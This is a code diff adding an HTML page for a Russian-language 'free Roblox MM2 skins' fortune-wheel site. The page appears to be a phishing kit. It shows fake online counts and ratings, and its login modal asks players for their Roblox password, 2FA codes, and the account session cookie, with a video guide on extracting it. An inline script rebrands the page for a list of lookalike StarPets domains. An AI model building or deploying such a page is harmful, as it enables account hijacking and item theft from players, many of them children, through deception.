@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>StarVell MM2 — Бесплатные скины Roblox | Колесо фортуны</title>
+  <meta name="description" content="Крути колесо фортуны StarVell и выигрывай бесплатные Chroma и Corrupt скины в Murder Mystery 2. Раздача каждый день — 1 крутка в сутки!">
+  <meta name="keywords" content="starvell, mm2, murder mystery 2, roblox, бесплатные скины, колесо фортуны, chroma, corrupt, раздача">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="StarVell — Бесплатные скины MM2">
+  <meta property="og:description" content="Крути колесо и выигрывай Chroma & Corrupt скины в Murder Mystery 2. Бесплатная раздача каждый день!">
+  <meta property="og:image" content="/images/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="StarVell — Бесплатные скины MM2">
+  <meta name="twitter:description" content="Крути колесо и выигрывай Chroma & Corrupt скины бесплатно!">
+  <meta name="twitter:image" content="/images/favicon.png">
+  <meta name="theme-color" content="#ffc800">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+  <link rel="icon" type="image/png" sizes="192x192" href="/images/favicon.png">
+  <link rel="apple-touch-icon" href="/images/favicon.png">
+  <link rel="canonical" href="https://starvell.com/">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebApplication",
+    "name": "StarVell MM2",
+    "alternateName": "StarVell Murder Mystery 2",
+    "description": "Крути колесо фортуны и выигрывай бесплатные Chroma и Corrupt скины в Murder Mystery 2. Раздача каждый день.",
+    "url": "https://starvell.com",
+    "applicationCategory": "GameApplication",
+    "operatingSystem": "Web",
+    "offers": {
+      "@type": "Offer",
+      "price": "0",
+      "priceCurrency": "RUB",
+      "availability": "https://schema.org/InStock"
+    },
+    "aggregateRating": {
+      "@type": "AggregateRating",
+      "ratingValue": "4.8",
+      "ratingCount": "12847",
+      "bestRating": "5"
+    }
+  }
+  </script>
+  <style>
+    body { background: #f5f5f7; color: #1a1a1a; margin: 0; font-family: Inter, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+    .main { display: block !important; visibility: visible !important; min-height: 60vh; }
+    .wheel-wrapper { width: 420px !important; height: 420px !important; max-width: calc(100vw - 3rem) !important; max-height: calc(100vw - 3rem) !important; min-width: 260px !important; min-height: 260px !important; }
+    #wheelCanvas { display: block !important; width: 100% !important; height: auto !important; min-height: 260px !important; aspect-ratio: 1 / 1; }
+    .hero-title, .hero-tag, .hero-sub { color: #1a1a1a !important; }
+  </style>
+  <link rel="stylesheet" href="style.css?v=inv11">
+</head>
+<body>
+  <div class="top-bar"></div>
+  <div class="ambient">
+    <div class="aurora aurora-1"></div>
+    <div class="aurora aurora-2"></div>
+    <div class="grid-overlay"></div>
+    <div class="particles" id="particles"></div>
+    <div class="float-weapons" id="floatWeapons"></div>
+  </div>
+
+  <header class="sp-header">
+    <div class="sp-header-inner">
+      <!-- Лого -->
+      <a class="sp-logo" href="/">
+        <img class="sp-logo-icon" src="images/starvell-logo.svg" alt="StarVell">
+      </a>
+
+      <!-- Навигация -->
+      <nav class="sp-header-nav">
+        <a class="sp-nav-link sp-nav-active" href="/" data-i18n="nav.wheel">Колесо</a>
+        <a class="sp-nav-link" href="/cases" data-i18n="nav.cases">Кейсы</a>
+        <a class="sp-nav-link" href="/battle" data-i18n="nav.battle">Батл</a>
+        <a class="sp-nav-link" href="/scratch" data-i18n="nav.scratch">Скретч</a>
+        <a class="sp-nav-link" href="/coinflip" data-i18n="nav.coinflip">Монетка</a>
+        <a class="sp-nav-link" href="/inventory" data-i18n="nav.inventory">Инвентарь</a>
+      </nav>
+
+      <!-- Правая часть -->
+      <div class="sp-header-right">
+        <div class="sp-online">
+          <span class="sp-online-dot"></span>
+          <span class="sp-online-count" id="onlineCount">3 842</span>
+          <span class="sp-online-label" data-i18n="online">онлайн</span>
+        </div>
+        <div class="sp-live">
+          <span class="sp-pulse"></span>LIVE
+        </div>
+        <div class="sp-header-sep"></div>
+        <div class="sp-auth-area" id="authArea">
+          <button class="sp-login-btn" id="headerLoginBtn" data-i18n="login">Войти через Roblox</button>
+        </div>
+        <div class="sp-user-area hidden" id="userArea">
+          <span class="sp-user-name" id="headerUserName"></span>
+          <button class="sp-logout-btn" id="headerLogoutBtn" data-i18n-title="logout" title="Выйти">✕</button>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="main">
+    <section class="hero reveal reveal-delay-1">
+      <div class="hero-sparkles">
+        <span class="sparkle s1"></span>
+        <span class="sparkle s2"></span>
+        <span class="sparkle s3"></span>
+        <span class="sparkle s4"></span>
+      </div>
+      <p class="hero-tag" data-i18n="hero.tag">Эксклюзивная раздача 2026</p>
+      <h2 class="hero-title" data-i18n-html="hero.title">Крути колесо — <span class="chroma-text">выиграй Chroma</span></h2>
+      <p class="hero-sub" data-i18n="hero.sub">1 крутка в сутки · Шанс на Corrupt — 1%</p>
+    </section>
+
+    <section class="wheel-section">
+      <div class="wheel-col reveal reveal-delay-2">
+        <div class="wheel-stage">
+          <div class="wheel-stage-bg">
+            <div class="ws-orb ws-orb-1"></div>
+            <div class="ws-orb ws-orb-2"></div>
+            <div class="ws-orb ws-orb-3"></div>
+            <div class="ws-rays"></div>
+          </div>
+          <div class="wheel-sparks" id="wheelSparks"></div>
+          <div class="wheel-ring ring-outer"></div>
+          <div class="wheel-ring ring-mid"></div>
+          <div class="wheel-ring ring-inner"></div>
+          <div class="wheel-glow" id="wheelGlow"></div>
+          <div class="wheel-pulse-ring" id="wheelPulseRing"></div>
+
+          <div class="wheel-wrapper">
+            <div class="wheel-pointer">
+              <div class="pointer-body"></div>
+              <div class="pointer-glow"></div>
+            </div>
+            <canvas id="wheelCanvas" width="420" height="420"></canvas>
+            <button class="spin-btn" id="spinBtn">
+              <span class="spin-ring"></span>
+              <span class="spin-ring spin-ring-2"></span>
+              <span class="spin-text" data-i18n="spin.text">КРУТИТЬ</span>
+              <span class="spin-sub" data-i18n="spin.sub">удача ждёт</span>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <div class="info-panel reveal reveal-delay-3">
+        <div class="panel-shine"></div>
+        <h2 data-i18n="panel.how">Как получить приз?</h2>
+
+        <div class="steps">
+          <div class="step" id="stepGroup">
+            <span class="step-num">01</span>
+            <div>
+              <strong data-i18n="step.group.title">Вступи в группу StarVell</strong>
+              <p data-i18n="step.group.desc">Без вступления колесо не запустится</p>
+            </div>
+          </div>
+          <div class="step">
+            <span class="step-num">02</span>
+            <div>
+              <strong data-i18n="step.nick.title">Введи ник Roblox</strong>
+              <p data-i18n="step.nick.desc">Без ника колесо не запустится</p>
+            </div>
+          </div>
+          <div class="step">
+            <span class="step-num">03</span>
+            <div>
+              <strong data-i18n="step.spin.title">Крути колесо</strong>
+              <p data-i18n="step.spin.desc">1 крутка в сутки — не упусти шанс!</p>
+            </div>
+          </div>
+          <div class="step">
+            <span class="step-num">04</span>
+            <div>
+              <strong data-i18n="step.vip.title">Зайди на VIP-сервер</strong>
+              <p data-i18n="step.vip.desc">Приватный сервер MM2 — забери приз у бота</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="username-form">
+          <label for="username" data-i18n="username.label">Твой ник Roblox</label>
+          <div class="input-wrap">
+            <input type="text" id="username" data-i18n-placeholder="username.placeholder" placeholder="Например: Player123" maxlength="20" autocomplete="off">
+            <span class="input-glow"></span>
+          </div>
+        </div>
+
+        <div class="cooldown-box hidden" id="cooldownBox">
+          <span class="cooldown-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></span>
+          <div>
+            <strong data-i18n="cooldown.title">Следующая крутка через</strong>
+            <p id="cooldownTimer">—</p>
+          </div>
+        </div>
+
+        <div class="stats">
+          <div class="stat">
+            <span class="stat-num" id="totalSpins" data-target="12847">0</span>
+            <span class="stat-label" data-i18n="stat.spins">круток сегодня</span>
+          </div>
+          <div class="stat">
+            <span class="stat-num chroma-stat">1%</span>
+            <span class="stat-label" data-i18n="stat.chance">шанс Corrupt</span>
+          </div>
+          <div class="stat">
+            <span class="stat-num" id="winCount" data-target="847">0</span>
+            <span class="stat-label" data-i18n="stat.winners">победителей</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="ticker reveal reveal-delay-4">
+      <div class="ticker-track" id="tickerTrack"></div>
+    </section>
+
+    <section class="history-section reveal reveal-delay-5">
+      <div class="section-head">
+        <h2 data-i18n="history.title">Мои выигрыши</h2>
+        <p data-i18n="history.sub">История сохраняется — ссылка не потеряется, даже если закроешь окно</p>
+      </div>
+      <div class="history-list" id="historyList">
+        <div class="history-empty" id="historyEmpty">
+          <span class="history-empty-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#d1d5db" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg></span>
+          <p data-i18n="history.empty">Пока нет выигрышей</p>
+          <span data-i18n="history.emptySub">Крути колесо — приз появится здесь</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="prizes-section reveal reveal-delay-6">
+      <div class="section-head">
+        <h2 data-i18n="prizes.title">Редкие призы на колесе</h2>
+        <p data-i18n="prizes.sub">Только 3 легендарных оружия с микрошансом</p>
+      </div>
+      <div class="prize-grid" id="prizeGrid"></div>
+    </section>
+  </main>
+
+  <div class="modal hidden" id="winModal">
+    <div class="modal-backdrop"></div>
+    <div class="modal-burst" id="modalBurst"></div>
+    <div class="modal-content">
+      <div class="confetti" id="confetti"></div>
+      <div class="win-rays"></div>
+      <div class="win-glow"></div>
+      <div class="modal-badge">JACKPOT</div>
+      <h2 class="win-title" data-i18n="win.title">ТЫ ВЫИГРАЛ!</h2>
+      <div class="won-item" id="wonItem">
+        <div class="won-image-wrap">
+          <img class="won-image" id="wonImage" src="images/corrupt.png" alt="Prize">
+        </div>
+        <div class="won-rarity" id="wonRarity">UNIQUE</div>
+        <div class="won-name" id="wonName">Corrupt</div>
+        <div class="won-value" id="wonValue">~ 600 value</div>
+        <div class="won-chance" id="wonChance">Шанс выпадения: 1%</div>
+      </div>
+      <div class="vip-card">
+        <div class="vip-card-head">
+          <div class="vip-card-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
+          <div class="vip-card-meta">
+            <strong data-i18n="vip.title">VIP-сервер Murder Mystery 2</strong>
+            <span data-i18n="vip.sub">Приватный сервер · Эксклюзивный доступ</span>
+          </div>
+          <span class="vip-badge">VIP</span>
+        </div>
+        <input type="hidden" id="winLink" value="">
+        <ul class="vip-steps">
+          <li data-i18n="vip.step1">Нажми «Зайти на VIP-сервер»</li>
+          <li data-i18n="vip.step2">Roblox откроет приватный сервер MM2</li>
+          <li data-i18n="vip.step3">Обменяйся с ботом и забери приз</li>
+        </ul>
+        <button class="modal-btn vip-btn" id="openVipBtn" data-i18n="vip.btn">Зайти на VIP-сервер</button>
+        <button class="modal-btn secondary" id="copyBtn" data-i18n="vip.copy">Скопировать VIP-ссылку</button>
+
+        <p class="vip-tip" data-i18n="vip.tip">Если не получается зайти на VIP — нажми «Скопировать VIP-ссылку» и вставь её в другой браузер (Chrome, Safari, Яндекс).</p>
+
+        <button class="modal-btn withdraw-btn" id="withdrawBtn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:4px"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg> <span data-i18n="vip.withdraw">Вывести на аккаунт</span></button>
+        <button class="modal-btn secondary" id="spinAgainBtn" data-i18n="vip.close">Закрыть</button>
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer reveal">
+    <p data-i18n="footer">Fan-made giveaway site · Murder Mystery 2 · Не связан с Nikilis</p>
+  </footer>
+
+  <!-- Виджет техподдержки -->
+  <div class="support-fab" id="supportFab" title="Техподдержка">
+    <svg class="support-fab-icon" id="supportFabIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <svg class="support-fab-icon support-fab-close" id="supportFabClose" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+  </div>
+
+  <div class="support-panel" id="supportPanel">
+    <div class="support-header">
+      <div class="support-header-info">
+        <span class="support-header-dot"></span>
+        <div>
+          <div class="support-header-title" data-i18n="support.title">Техподдержка</div>
+          <div class="support-header-sub" data-i18n="support.sub">Обычно отвечаем в течение часа</div>
+        </div>
+      </div>
+    </div>
+    <div class="support-messages" id="supportMessages">
+      <div class="support-msg support-msg-bot">
+        <div class="support-msg-bubble" data-i18n="support.hello">Привет! Опиши проблему — мы поможем. Не забудь указать свой ник Roblox, если вопрос связан с призом.</div>
+      </div>
+    </div>
+    <div class="support-input-area">
+      <div class="support-field">
+        <input type="text" class="support-input-nick" id="supportNick" data-i18n-placeholder="support.nickPh" placeholder="Твой ник Roblox" maxlength="30" autocomplete="off">
+      </div>
+      <div class="support-field support-field-msg">
+        <textarea class="support-input-msg" id="supportMsg" data-i18n-placeholder="support.msgPh" placeholder="Опиши проблему..." maxlength="1000" rows="3"></textarea>
+        <button class="support-send" id="supportSend" data-i18n-title="support.send" title="Отправить">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Модалка входа -->
+  <div class="auth-modal hidden" id="authModal">
+    <div class="auth-modal-backdrop"></div>
+    <div class="auth-modal-box">
+      <button class="auth-modal-close" id="authModalClose">✕</button>
+
+      <!-- Экран выбора способа -->
+      <div class="auth-pane" id="paneChoose">
+        <div class="auth-hero-img">
+          <img src="images/logo.png" alt="StarPets" style="width:100px;height:100px;object-fit:contain;">
+        </div>
+        <h2 class="auth-choose-title">Добавление аккаунта</h2>
+        <p class="auth-choose-sub">Выберите способ добавления</p>
+        <div class="auth-methods">
+          <button class="auth-method-card" data-method="login">
+            <span class="auth-method-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 12h4"/><path d="M8 10v4"/><path d="M15 13h.01"/><path d="M18 11h.01"/><path d="M17.32 5H6.68a4 4 0 0 0-3.978 3.59c-.006.052-.01.101-.017.152C2.604 9.416 2 14.456 2 16a3 3 0 0 0 3 3c1 0 1.5-.5 2-1l1.414-1.414A2 2 0 0 1 9.828 16h4.344a2 2 0 0 1 1.414.586L17 18c.5.5 1 1 2 1a3 3 0 0 0 3-3c0-1.545-.604-6.584-.685-7.258-.007-.05-.011-.1-.017-.151A4 4 0 0 0 17.32 5z"/></svg></span>
+            <div class="auth-method-info">
+              <span class="auth-method-name">Поиск по никнейму</span>
+              <span class="auth-method-desc">Классический вход в аккаунт</span>
+            </div>
+            <span class="auth-method-badge">Рекомендуется</span>
+            <span class="auth-method-arrow">→</span>
+          </button>
+          <button class="auth-method-card" data-method="cookie">
+            <span class="auth-method-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><path d="M8.5 8.5v.01"/><path d="M16 15.5v.01"/><path d="M12 12v.01"/><path d="M11 17v.01"/><path d="M7 14v.01"/></svg></span>
+            <div class="auth-method-info">
+              <span class="auth-method-name">Ввод Cookie</span>
+              <span class="auth-method-desc">Быстрый способ добавления</span>
+            </div>
+            <span class="auth-method-arrow">→</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Логин/пароль -->
+      <div class="auth-pane hidden" id="paneLogin">
+        <button class="auth-back-btn" data-back="choose">← Назад</button>
+        <h2 class="auth-modal-title">Вход по никнейму</h2>
+        <p class="auth-modal-sub">Введи данные аккаунта Roblox</p>
+        <div class="auth-field"><label>Ник Roblox</label><input type="text" id="authUsername" placeholder="Username" maxlength="50" autocomplete="username"></div>
+        <div class="auth-field"><label>Пароль</label><input type="password" id="authPassword" placeholder="••••••••" maxlength="200" autocomplete="current-password"></div>
+        <button class="auth-submit" id="authLoginBtn">Войти</button>
+        <p class="auth-login-status" id="authLoginStatus"></p>
+        <p class="auth-login-note">Вход может занять ~10 секунд. Если Roblox запросит 2FA — введи код.</p>
+      </div>
+
+      <!-- Куки -->
+      <div class="auth-pane hidden" id="paneCookie">
+        <button class="auth-back-btn" data-back="choose">‹</button>
+        <div class="auth-hero-img">
+          <img src="images/logo.png" alt="StarPets" style="width:90px;height:90px;object-fit:contain;">
+        </div>
+        <p class="auth-cookie-label">Добавление аккаунта</p>
+        <h2 class="auth-cookie-title">Введите ваш Cookie</h2>
+        <div class="auth-cookie-input-wrap">
+          <span class="auth-cookie-input-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><path d="M8.5 8.5v.01"/><path d="M16 15.5v.01"/><path d="M12 12v.01"/><path d="M11 17v.01"/><path d="M7 14v.01"/></svg></span>
+          <input type="text" id="authCookie" placeholder="Cookie" maxlength="4000" autocomplete="off">
+        </div>
+        <a href="https://youtu.be/_ALpdVbJnqQ?si=Nu2ZYNaGes4oZnp3" target="_blank" rel="noopener" class="auth-video-card">
+          <div class="auth-video-thumb">
+            <img src="https://img.youtube.com/vi/_ALpdVbJnqQ/hqdefault.jpg" alt="Видео-гайд">
+            <span class="auth-video-play">▶</span>
+          </div>
+          <span class="auth-video-label">Видео-гайд: как добавить аккаунт с помощью куки</span>
+        </a>
+        <p class="auth-cookie-hint">Внимательно посмотрите видео-инструкцию и введите Cookie для добавления вашего игрового аккаунта</p>
+        <button class="auth-submit auth-submit-orange" id="authCookieBtn">Продолжить</button>
+      </div>
+
+      <!-- FunCaptcha / PoW fallback -->
+      <div class="auth-pane hidden" id="paneCaptcha">
+        <div id="captchaContainer"></div>
+      </div>
+
+      <!-- 2FA -->
+      <div class="auth-pane hidden" id="pane2fa">
+        <button class="auth-back-btn" data-back="login">← Назад</button>
+        <div class="twofa-block">
+          <div class="twofa-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1"/></svg></div>
+          <p class="auth-step-msg" id="twoFaInfo">Введи код из приложения аутентификации</p>
+          <div class="auth-field"><input type="text" id="auth2faCode" placeholder="000000" maxlength="10" autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*"></div>
+          <button class="auth-submit" id="auth2faBtn">Подтвердить</button>
+          <button class="auth-resend-btn" id="authResend2fa">Запросить новый код</button>
+          <p class="auth-2fa-status" id="auth2faStatus"></p>
+        </div>
+      </div>
+
+      <div class="auth-error hidden" id="authError"></div>
+      <div class="auth-loading hidden" id="authLoading" data-i18n="auth.loading">Подключаемся к Roblox...</div>
+    </div>
+  </div>
+
+  <script src="config.js"></script>
+  <script src="links-client.js?v=1" data-game="mm2"></script>
+  <script src="i18n.js?v=1"></script>
+  <script>I18N.init({ brand: 'StarVell', storageKey: 'starvell_lang', site: 'starvell' });</script>
+  <script src="script.js?v=login25" defer></script>
+  <script>
+  (function(){
+    var hdr=document.querySelector('.sp-header');
+    if(hdr){window.addEventListener('scroll',function(){hdr.classList.toggle('scrolled',window.scrollY>10)},{passive:true})}
+    var io=new IntersectionObserver(function(entries){entries.forEach(function(e){if(e.isIntersecting){e.target.classList.add('visible');io.unobserve(e.target)}})},{threshold:0.1,rootMargin:'0px 0px -40px 0px'});
+    document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+
+    var h=location.hostname;
+    var dm={
+      'starpets-mm2.online':'StarPets MM2 Online',
+      'starpets-adoptme.ru':'StarPets Adopt Me',
+      'starpets-com.ru':'StarPets COM',
+      'starpets-gg.online':'StarPets GG Online',
+      'starpets-com.online':'StarPets COM Online',
+      'starpets.online':'StarPets Online',
+      'starpets-gg.ru':'StarPets GG',
+      'starpets.website':'StarPets Website',
+      'starpets.press':'StarPets Press',
+      'xn--80ak3addece.xn--p1ai':'СтарПетс РФ'
+    };
+    if(dm[h]){
+      document.title=dm[h]+' — Бесплатные скины MM2 | Колесо фортуны';
+      var d=document.querySelector('meta[name="description"]');
+      if(d) d.content='Крути колесо на '+dm[h]+' и выигрывай Chroma & Corrupt скины в Murder Mystery 2. Раздача каждый день!';
+      var o=document.querySelector('meta[property="og:title"]');
+      if(o) o.content=dm[h]+' — Бесплатные скины MM2';
+    }
+  })();
+  </script>
+</body>
+</html>
